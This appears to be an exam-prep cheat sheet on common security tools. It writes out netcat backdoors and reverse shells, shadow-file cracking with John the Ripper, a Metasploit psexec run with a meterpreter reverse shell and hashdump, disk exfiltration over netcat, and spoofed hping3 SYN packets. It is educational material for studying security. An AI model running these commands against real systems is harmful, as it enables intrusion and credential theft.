# Common Tools

## Exam Outcome

Demonstrate competence with common tools including netcat, SSH, Ettercap, p0f, etc...

### netcat

netcat options:

-l		    Listen (server) mode; default is client mode.
-L        Listen persistently (continue after first client disconnects); Windows only.
-l -k     Listen persistently option for Linux.
-p        Local port number to use (source port in client mode).
-u        Operate in UDP mode (default is TCP).
-n        Don’t perform DNS lookups.
-wN       Timeout in N seconds for client or server mode before exiting.
-v        Prints verbose status info to stderr.
-vv       Prints extra verbose info to stderr.
-e cmd    Execute cmd and pipe netcat IO to program via stdin/stdout.
-z        When in client mode, emit packets with no payload.


Setting up a Listener:

```
nc -l -p [port]
nc -l -p [2222]
```

Connecting to the Listener:

```
nc [ip_of_listener] [port]
nc 10.10.75.75 2222
```

Create backdoor on Linux:

```
nc -l [port] -e /bin/sh
nc -l 7777 -e /bin/sh
```

Connect to the backdoor:

```
nc.exe [ip_of_listener] [port]
nc.exe 10.10.75.75 7777
```

Create reverse shell on Windows
```
[Attacker] nc -l -p 8888
[Victim] nc 10.10.10.10 8888 -e cmd.exe
```

Pulling a file:

```
[Listener]echo "this is a test" > text.txt
[Listener]nc -l -p 1234 < text.txt

[Client]nc [Listerner IP] > received.txt
```

Pushing a file:

```
[Client]echo "test" > file.txt
[Listener]nc -l -p 4321 > received.txt
[Client] nc 10.10.10.1 4321 < file.txt
[Listener] type receive.txt
```

Create a Linux relay:

Run listening shell on Windows (victim):

```
nc -l -p 54321 -e cmd.exe
```

#### Create a FIFO named pipe on Linux (attacker) #1:

```
mknod backpipe p
```

Create a relay and interact with the named pipe (attacker):

```
nc -l -p 11111 0<backpipe | nc 10.10.10.1 54321 1>backpipe
```

Open new terminal on Linux (attacker) and run netcat to connect to the relay:

```
nc 127.0.0.1 11111
```
#### Create a TCP Backpipe #2:

Create a Named Pipe
```
mknod backpipe /tmp/ncpipe
```

Create an NC relay which forwards the data from the listen service, to the target system.
```
nc -l -p <port> 0<backpipe | nc <TargetIP> <port> | tee backpipe
```
The backpipe in this instance (/tmp/ncpipe) is the location where data is stored and fed back into the pipe. Essentially completing a return loop!

#### TCP Tunnel
```
echo nc <Target IP> <port> > relay.bat
nc -l -p <port> -e relay.bat
```

#### Remote Shell
```
nc -l -p <port> -e /bin/bash
nc -l -p <port> -e cmd.exe
```

#### Port Scanning
```
nc -v -n -z -w1 -r <Target IP> <portstart>-<portend>
```

#### Banner Grab
```
echo "" | nc -v -n -w1 =r <Target IP> <portstart>-<portend>
```

#### Makeshift Webserver
```
while true; do nc -l -p 80 (or 443) -q 1 < maintenance.html; done
```
You have to actually have made a Maintenance file for this to work

#### Remote Partition
```
dd if=/dev/sdc | nc <Target IP> <port>
nc -l -p <port> | dd of=/tmp/sdc.img
```

### SSH

### Ettercap

### p0f

### John the Ripper

John the Ripper is essentially a password cracking tool.  You can utilize John the Ripper to perform password cracking once you've retrieved password hashes from a target.

First, you need to combine the passwd and shadow files (from a Linux machine).  The following examples assumes you've taken a copy of /etc/passwd and /etc/shadow and moved them to the /tmp directory:

```
./unshadow /tmp/passwd_copy /tmp/shadow_copy > /tmp/combined
```

Running John is trival:

```
./john /tmp/combined
```

### Cain & Abel

Cain & Abel is an auditing tool that can be used for testing the strength of passwords on Windows machines.

### Metasploit

Starting Metasploit:

```
msfconsole
```

Listing exploits:

```
show exploits
```

Searching exploits:

```
search type:exploit psexec
```

Acquiring info on an exploit:

```
info exploit/windows/smb/psexec
```

Selecting an exploit to use:

```
use exploit/windows/smb/psexec
```

Configuring exploit settings:

```
set PAYLOAD windows/meterpreter/reverse_tcp
```

Showing options:

```
show options
```

Configuring variables:

```
set RHOST [Target IP]
set SMBUser [username]
set SMBPass [password]
set LHOST [source/attacker IP]
```

Launching exploit:

```
exploit
```

Backgrounding a session:

```
background
```

Listing sessions:

```
sessions -l
```

```
sessions -i [session #]
```

Popular meterpreter commands:

```
?
sysinfo
getuid
pwd
getpid
ps
hashdump
run hashdump
```

### Volatility

Getting usage and help

```
python vol.py -h
```

Getting process list:

```
python vol.py pslist -f /path/to/memory/dump/mem.dd --profile=Win7SP0x86
```

### Hping3

Hping3 is a command-line packet analyzer that supports the TCP, UDP, ICMP, and RAW-IP protocols.

```
hping3 --help
```

Running hping3 with TCP SYN flags:

```
hping3 -S [IP address]
```

Running hping3 with TCP SYN flags and a spoofed source address:

```
hping3 [IP Address] -a [spoofed IP] -S
```

### Dumpsec

Dumpsec gathers information about a remote host without providing valid authentication; you gain info on registry, file system, and printers; users and groups; policies, rights, and services.

### etc...
